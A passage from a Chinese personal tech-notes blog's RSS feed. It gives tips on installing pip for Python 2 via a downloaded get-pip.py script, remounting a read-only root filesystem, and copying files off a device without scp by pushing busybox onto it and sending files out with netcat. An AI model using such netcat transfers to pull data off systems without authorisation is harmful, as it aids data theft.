故，我们不能使用tar.gz安装pip和apt安装pip。
这时我们可以去pipy下载对应python2的pip源码：
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py -O get-pip.pypython get-pip.py </description>
    </item>
    
    <item>
      <title>报错read-only file system解决方法</title>
      <link>https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E6%8A%A5%E9%94%99read-only-file-system%E7%BB%93%E5%B1%80%E6%96%B9%E6%B3%95/</guid>
      <description>mount -o remount,rw / 使用mount命令重新挂载根目录，给一个可读可写的权限</description>
    </item>
    
    <item>
      <title>设备无scp命令时将文件传出的方法</title>
      <link>https://jellyfish-pro.github.io/note/%E8%AE%BE%E5%A4%87%E6%97%A0scp%E5%91%BD%E4%BB%A4%E6%97%B6%E5%B0%86%E6%96%87%E4%BB%B6%E4%BC%A0%E5%87%BA%E7%9A%84%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/note/%E8%AE%BE%E5%A4%87%E6%97%A0scp%E5%91%BD%E4%BB%A4%E6%97%B6%E5%B0%86%E6%96%87%E4%BB%B6%E4%BC%A0%E5%87%BA%E7%9A%84%E6%96%B9%E6%B3%95/</guid>
      <description>首先检查是否有wget或curl
然后检查设备的busybox中是否有nc命令
本地开启http服务，准备好对应架构的busybox，利用wget或curl获取busybox
随后在本地打开nc准备接受：
nc -l port &amp;gt; your_file 在设备上使用命令：
./busybox nc ip port &amp;lt; your_file </description>
    </item>
    
  </channel>
</rss>
